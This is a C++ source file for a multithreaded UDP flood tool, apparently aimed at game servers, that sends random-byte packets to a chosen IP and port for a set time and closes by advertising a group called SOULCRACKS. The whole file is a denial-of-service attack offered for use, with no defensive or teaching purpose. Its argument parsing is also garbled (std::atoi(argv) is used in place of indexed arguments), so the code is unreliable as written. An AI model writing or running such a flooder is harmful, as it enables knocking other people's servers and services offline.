#include <iostream>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>
#include <pthread.h>
#include <ctime>
#include <csignal>
#include <vector>
#include <memory>
#include <random>
#ifdef _WIN32
    #include <windows.h>
    void usleep(int duration) { Sleep(duration / 1000); }
#else
    #include <unistd.h>
#endif

#define PAYLOAD_SIZE 20

// Efficient advanced payload: any bytes
void generate_payload(char *buffer, size_t size) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distrib(0, 255); // Full byte range
    for (size_t i = 0; i < size; ++i) {
        buffer[i] = static_cast<unsigned char>(distrib(gen));
    }
}

class Attack {
public:
    Attack(const std::string& ip, int port, int duration, int thread_id)
        : ip(ip), port(port), duration(duration), thread_id(thread_id) {}

    void attack_thread() {
        int sock;
        struct sockaddr_in server_addr;
        time_t endtime;

        char payload[PAYLOAD_SIZE + sizeof(thread_id) + sizeof(time_t)];

        if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            perror("Socket creation failed");
            pthread_exit(NULL);
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        server_addr.sin_addr.s_addr = inet_addr(ip.c_str());

        endtime = time(NULL) + duration;
        while (time(NULL) <= endtime) {
            generate_payload(payload, PAYLOAD_SIZE);

            // Add thread_id and timestamp for uniqueness
            memcpy(payload + PAYLOAD_SIZE, &thread_id, sizeof(thread_id));
            time_t tstamp = time(NULL);
            memcpy(payload + PAYLOAD_SIZE + sizeof(thread_id), &tstamp, sizeof(tstamp));

            ssize_t payload_size = PAYLOAD_SIZE + sizeof(thread_id) + sizeof(tstamp);
            if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                // Just continue on error, don't exit
                continue;
            }
        }
        close(sock);
    }

private:
    std::string ip;
    int port;
    int duration;
    int thread_id;
};

void handle_sigint(int sig) {
    std::cout << "\nStopping attack...\n";
    exit(0);
}

void usage() {
    std::cout << "Usage: ./bgmi ip port duration threads\n";
    exit(1);
}

struct ThreadArgs {
    Attack* attack;
};

void* thread_entry(void* arg) {
    ThreadArgs* args = static_cast<ThreadArgs*>(arg);
    args->attack->attack_thread();
    return nullptr;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    std::string ip = argv[1];
    int port = std::atoi(argv);
    int duration = std::atoi(argv);
    int threads = std::atoi(argv);

    std::signal(SIGINT, handle_sigint);

    std::vector<pthread_t> thread_ids(threads);
    std::vector<std::unique_ptr<Attack>> attacks;
    std::vector<std::unique_ptr<ThreadArgs>> thread_args;

    std::cout << "Attack started on " << ip << ":" << port << " for " << duration << " seconds with " << threads << " threads\n";

    for (int i = 0; i < threads; i++) {
        attacks.push_back(std::make_unique<Attack>(ip, port, duration, i));
        thread_args.push_back(std::make_unique<ThreadArgs>());
        thread_args[i]->attack = attacks[i].get();

        if (pthread_create(&thread_ids[i], NULL, thread_entry, thread_args[i].get()) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        std::cout << "Launched thread with ID: " << thread_ids[i] << "\n";
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    std::cout << "Attack finished. Join @SOULCRACKS\n";
    return 0;
}
// Compile: g++ -std=c++14 soulcracks.cpp -o soul -pthread
